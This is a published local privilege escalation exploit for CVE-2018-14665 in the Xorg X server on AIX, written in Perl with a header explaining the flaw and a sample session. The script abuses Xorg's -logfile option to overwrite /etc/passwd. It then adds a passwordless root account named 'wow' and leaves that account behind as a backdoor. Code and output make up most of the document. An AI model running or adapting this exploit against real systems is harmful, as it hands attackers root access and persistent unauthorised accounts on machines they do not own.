# Exploit Title: AIX Xorg X11 Server - Local Privilege Escalation
# Date: 29/11/2018
# Exploit Author: @0xdono
# Original Discovery and Exploit: Narendra Shinde
# Vendor Homepage: https://www.x.org/
# Platform: AIX
# Version: X Window System Version 7.1.1
# Fileset: X11.base.rte < 7.1.5.32
# Tested on: AIX 7.1 (6.x to 7.x should be vulnerable)
# CVE: CVE-2018-14665
#
# Explanation:
# Incorrect command-line parameter validation in the Xorg X server can
# lead to privilege elevation and/or arbitrary files overwrite, when the
# X server is running with elevated privileges.
# The -logfile argument can be used to overwrite arbitrary files in the
# file system, due to incorrect checks in the parsing of the option.
#
# This is a port of the OpenBSD X11 Xorg exploit to run on AIX.
# It overwrites /etc/passwd in order to create a new user with root privileges. 
# All currently logged in users need to be included when /etc/passwd is overwritten,
# else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user.
# The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,
# and is replaced by '-config'.
# ksh93 is used for ANSI-C quoting, and is installed by default on AIX.
#
# IBM has not yet released a patch as of 29/11/2018.
#
# See also:
# https://lists.x.org/archives/xorg-announce/2018-October/002927.html
# https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html
# https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl
#
# Usage:
#  $ oslevel -s
#  7100-04-00-0000
#  $ Xorg -version
#  
#  X Window System Version 7.1.1
#  Release Date: 12 May 2006
#  X Protocol Version 11, Revision 0, Release 7.1.1
#  Build Operating System: AIX IBM
#  Current Operating System: AIX sovma470 1 7 00C3C6F54C00
#  Build Date: 07 July 2006
#          Before reporting problems, check http://wiki.x.org
#          to make sure that you have the latest version.
#  Module Loader present
#  $ id
#  uid=16500(nmyo) gid=1(staff)
#  $ perl aixxorg.pl
#  [+] AIX X11 server local root exploit
#  [-] Checking for Xorg and ksh93 
#  [-] Opening /etc/passwd 
#  [-] Retrieving currently logged in users 
#  [-] Generating Xorg command 
#  [-] Opening /tmp/wow.ksh 
#  [-] Writing Xorg command to /tmp/wow.ksh 
#  [-] Backing up /etc/passwd to /tmp/passwd.backup 
#  [-] Making /tmp/wow.ksh executable 
#  [-] Executing /tmp/wow.ksh 
#  [-] Cleaning up /etc/passwd and removing /tmp/wow.ksh 
#  [-] Done 
#  [+] 'su wow' for root shell 
#  $ su wow
#  # id
#  uid=0(root) gid=0(system)
#  # whoami
#  root

#!/usr/bin/perl
print "[+] AIX X11 server local root exploit\n";

# Check Xorg is in path
print "[-] Checking for Xorg and ksh93 \n";
chomp($xorg = `command -v Xorg`);
if ($xorg eq ""){ 
    print "[X] Can't find Xorg binary, try hardcode it? exiting... \n";
    exit;
}

# Check ksh93 is in path
chomp($ksh = `command -v ksh93`);
if ($ksh eq ""){
    print "[X] Can't find ksh93 binary, try hardcode it? exiting... \n";
    exit;
}

# Read in /etc/passwd
print "[-] Opening /etc/passwd \n";
open($passwd_fh, '<', "/etc/passwd");
chomp(@passwd_array = <$passwd_fh>);
close($passwd_fh);

# Retrieve currently logged in users
print "[-] Retrieving currently logged in users \n";
@users = `who | cut -d' ' -f1 | sort | uniq`;
chomp(@users);

# For all logged in users, add their current passwd entry to string
# that will be used to overwrite passwd
$users_logged_in_passwd = '';
foreach my $user (@users)
{
    $user .= ":";
    foreach my $line (@passwd_array)
    {
        if (index($line, $user) == 0) {
            $users_logged_in_passwd = $users_logged_in_passwd . '\n' . $line;
        }
    }
}

# Use '-config' as '-fp' (which is used in the original BSD exploit) is not written to log
print "[-] Generating Xorg command \n";
$blob = '-config ' . '$\'' . $users_logged_in_passwd . '\nwow::0:0::/:/usr/bin/ksh\n#' . '\'';

print "[-] Opening /tmp/wow.ksh \n";		
open($fr, '>', "/tmp/wow.ksh");

# Use ksh93 for ANSI-C quoting
print "[-] Writing Xorg command to /tmp/wow.ksh \n";
print $fr '#!' . "$ksh\n";
print $fr "$xorg $blob -logfile ../etc/passwd :1  > /dev/null 2>&1 \n";
close $fr;

# Backup passwd 
print "[-] Backing up /etc/passwd to /tmp/passwd.backup \n";
system("cp /etc/passwd /tmp/passwd.backup");

# Make script executable and run it
print "[-] Making /tmp/wow.ksh executable \n";
system("chmod +x /tmp/wow.ksh");
print "[-] Executing /tmp/wow.ksh \n";
system("/tmp/wow.ksh");

# Replace overwritten passwd with: original passwd + wow user
print "[-] Cleaning up /etc/passwd and removing /tmp/wow.ksh \n";
$result = `su wow "-c cp /tmp/passwd.backup /etc/passwd && echo 'wow::0:0::/:/usr/bin/ksh' >> /etc/passwd" && rm /tmp/wow.ksh`;

print "[-] Done \n";
print "[+] 'su wow' for root shell \n";